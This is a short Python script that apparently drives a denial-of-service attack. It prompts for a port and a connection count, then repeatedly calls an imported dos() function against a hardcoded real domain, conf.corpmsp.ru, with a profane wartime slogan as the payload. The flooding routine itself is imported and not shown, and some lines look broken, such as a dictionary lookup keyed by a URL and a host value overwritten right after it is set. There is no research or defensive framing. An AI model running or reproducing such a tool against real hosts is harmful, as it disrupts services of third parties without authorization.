import time, socket, os, sys, string

from tools.functools import dos, read_ip_from_file, clear_ip_data

if __name__ == '__main__':
    port = int(input('Enter port to attack: '))
    conn = int(input('Enter number of connections: '))
    message = "Russian warship go fuck yourself"
    current_dir = os.getcwd()
    current_read_file = os.path.join(current_dir, 'configs', 'config')
    data = read_ip_from_file(current_read_file)
    data2 = clear_ip_data(data=data)
    host = data[0].strip()
    host = 'conf.corpmsp.ru'
    print(host)
    ip = socket.gethostbyname(data2['https://conf.corpmsp.ru'])
    print(ip)
    for i in range(1, conn):
        dos(host=host, port=port, message=message, ip=ip)





# print("[" + ip + "]")
# print("[Ip is locked]")
# print("[Attacking " + host + "]")
# print("+----------------------------+")
